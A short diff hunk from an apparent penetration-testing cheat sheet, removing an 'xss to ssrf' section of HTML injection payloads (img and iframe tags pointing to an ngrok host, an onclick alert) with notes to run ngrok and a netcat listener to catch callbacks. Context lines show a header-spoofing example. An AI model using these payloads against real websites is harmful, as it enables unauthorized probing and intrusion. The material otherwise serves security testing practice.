@@ -1103,27 +1103,6 @@ python3 -m http.server -m 80
 X-Forwarded-For: 1.1.1.1
 
 ```
-->xss to ssrf
--step 1
-
-```
-<img src="http://774a8fa27a0a.ngrok.io/bogus.php" alt="Image">
-
-<a href="#" onclick="alert(1)">XSS</a>
-
-<a href="https://google.com">xss</a>
-
-<svg width="100" height="100">
-  <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
-</svg>
-
-<a href="https://google.com">xss</a>
-
-<iframe width="560" height="315" src="http://774a8fa27a0a.ngrok.io/bogus.svg"></iframe>
-
-```
->next ngrok http port
->next netcat -l -k -v port
 
 
 
